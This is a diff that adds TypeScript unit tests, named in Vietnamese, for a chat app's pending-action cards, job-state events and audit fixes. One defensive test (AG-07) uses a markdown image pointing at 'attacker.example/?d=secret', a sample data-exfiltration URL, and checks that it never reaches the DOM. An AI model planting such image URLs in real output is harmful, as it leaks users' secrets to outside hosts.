@@ -678,3 +678,94 @@ test("bật lại tự kích hoạt sau khi lời hứa cũ hết hiệu lực: 
   // Dựng lại từ hello / reconnect cũng vậy.
   assert.equal(applyWatchState(jobs, ["E"], { E: true }).E.autoActivateSkipped, undefined);
 });
+
+// ------------------------------------------------------------------ thẻ xác nhận (audit AG-01) và ảnh (AG-07)
+
+import { applyActionEvent, reconcileActions, visibleActions, type PendingActionView } from "./actions";
+import { MarkdownImage } from "./markdown";
+
+const PENDING = {
+  type: "action_pending",
+  action_id: "act-1",
+  token: "tok-1",
+  kind: "train",
+  status: "pending",
+  summary: { dataset_id: "ds-1", target: "y", feature_count: 2, features: ["a", "b"] },
+  offers: { auto_activate: true },
+  expires_at: 1_700_000_000,
+};
+
+test("action_pending tạo thẻ; action_resolved cập nhật; phát lại không hồi sinh thẻ đã xử lý", () => {
+  let actions: Record<string, PendingActionView> = {};
+  actions = applyActionEvent(actions, { seq: 1, ...PENDING });
+  assert.equal(actions["act-1"].status, "pending");
+  assert.equal(actions["act-1"].offersAutoActivate, true);
+  actions = applyActionEvent(actions, { seq: 2, type: "action_resolved", action_id: "act-1", status: "done", result: { job_id: "job-1" } });
+  assert.equal(actions["act-1"].status, "done");
+  assert.deepEqual(actions["act-1"].result, { job_id: "job-1" });
+  const again = applyActionEvent(actions, { seq: 1, ...PENDING });
+  assert.equal(again, actions);
+});
+
+test("thẻ thiếu token hoặc loại lạ bị bỏ qua", () => {
+  assert.deepEqual(applyActionEvent({}, { ...PENDING, token: undefined }), {});
+  assert.deepEqual(applyActionEvent({}, { ...PENDING, kind: "delete_everything" }), {});
+});
+
+test("reconcile: thẻ server không còn chờ thì hết hiệu lực; thẻ mới từ hello được thêm", () => {
+  let actions = applyActionEvent({}, PENDING);
+  actions = reconcileActions(actions, [{ ...PENDING, action_id: "act-2", token: "tok-2", kind: "activate" }]);
+  assert.equal(actions["act-1"].status, "expired");
+  assert.equal(actions["act-2"].status, "pending");
+  assert.equal(actions["act-2"].kind, "activate");
+  assert.equal(reconcileActions(actions, undefined), actions);
+});
+
+test("chỉ hiện thẻ đang chờ và vài thẻ vừa xử lý; thẻ bị thay thì ẩn", () => {
+  let actions: Record<string, PendingActionView> = {};
+  for (let i = 1; i <= 6; i++) actions = applyActionEvent(actions, { ...PENDING, action_id: `act-${i}`, token: `t${i}` });
+  for (let i = 1; i <= 5; i++) {
+    actions = applyActionEvent(actions, { type: "action_resolved", action_id: `act-${i}`, status: i === 5 ? "superseded" : "done" });
+  }
+  assert.deepEqual(visibleActions(actions).map((a) => a.actionId), ["act-2", "act-3", "act-4", "act-6"]);
+});
+
+test("model_activation chỉ đổi cờ kích hoạt của job đã có thẻ", () => {
+  const jobs: Record<string, JobView> = { "job-1": { jobId: "job-1", status: "completed" } };
+  const next = applyJobEvent(jobs, { type: "model_activation", job_id: "job-1", activated: true, time: 1 });
+  assert.equal(next["job-1"].activated, true);
+  assert.equal(next["job-1"].status, "completed");
+  assert.equal(applyJobEvent(jobs, { type: "model_activation", job_id: "job-9", activated: true }), jobs);
+});
+
+test("ảnh markdown không thành <img> và URL không vào DOM (AG-07)", () => {
+  const element = MarkdownImage({ src: "https://attacker.example/?d=secret", alt: "biểu đồ" }) as any;
+  assert.equal(element.type, "span");
+  assert.ok(!JSON.stringify(element.props).includes("attacker.example"));
+  assert.match(String(element.props.children), /biểu đồ/);
+});
+
+test("job_done mang nguồn điểm cho thẻ job (AG-02)", () => {
+  const base: Record<string, JobView> = { "job-1": { jobId: "job-1", status: "running" } };
+  const cv = applyJobEvent(base, { type: "job_done", job_id: "job-1", status: 1, score_source: "cv", time: 2 });
+  assert.equal(cv["job-1"].scoreSource, "cv");
+  const unknown = applyJobEvent(base, { type: "job_done", job_id: "job-1", status: 1, score_source: null, time: 2 });
+  assert.equal(unknown["job-1"].scoreSource, null);
+  const legacy = applyJobEvent(base, { type: "job_done", job_id: "job-1", status: 1, time: 2 });
+  assert.equal(legacy["job-1"].scoreSource, undefined);
+});
+
+test("danh sách chụp TRƯỚC khi thẻ ra đời không làm thẻ hết hiệu lực; danh sách sau hồi sinh thẻ bị đánh dấu nhầm", () => {
+  // Thẻ kích hoạt watcher tạo (seq 10) tới trước reply của lượt chat có danh sách chụp lúc seq 9.
+  let actions = applyActionEvent({}, { seq: 10, ...PENDING });
+  actions = reconcileActions(actions, [], 9);
+  assert.equal(actions["act-1"].status, "pending");
+  // Server cũ không gửi mốc: bị đánh dấu hết, nhưng hello sau còn thẻ thì sống lại.
+  actions = reconcileActions(actions, []);
+  assert.equal(actions["act-1"].status, "expired");
+  actions = reconcileActions(actions, [PENDING], 12);
+  assert.equal(actions["act-1"].status, "pending");
+  // Thẻ server đã báo kết thúc thì không hồi sinh.
+  actions = applyActionEvent(actions, { seq: 13, type: "action_resolved", action_id: "act-1", status: "rejected" });
+  assert.equal(reconcileActions(actions, [PENDING], 14)["act-1"].status, "rejected");
+});
